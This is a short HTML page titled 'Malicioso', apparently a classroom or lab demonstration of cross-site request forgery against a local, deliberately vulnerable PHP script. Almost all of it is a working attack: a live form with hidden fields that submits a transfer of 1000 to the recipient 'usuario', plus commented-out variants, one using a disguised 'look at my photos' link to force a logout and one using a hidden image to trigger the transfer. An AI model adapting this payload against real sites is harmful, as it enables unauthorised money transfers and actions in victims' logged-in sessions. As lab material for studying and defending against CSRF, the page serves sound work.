<!DOCTYPE html>
<html>
<head>
	<title>Malicioso</title>
</head>
<body>
	<style type="text/css">
		a{
			color: green;
		}
	</style>
	<p>Este es un archivo malcioso</p>
	<!--<a href="http://127.0.0.1/csrf/process_vulnerable.php?action=logout">Mira mis fotos</a>-->
	<!--<img src="process_vulnerable.php?action=transfer" style="display: none;">-->
	<form action="process_vulnerable.php?action=transfer" method="POST">
	<input type="hidden" name="destinatary" value="usuario">
	<input type="hidden" name="quantity" value="1000">
	<input type="submit" value="submit">
	</form>

</body>
</html>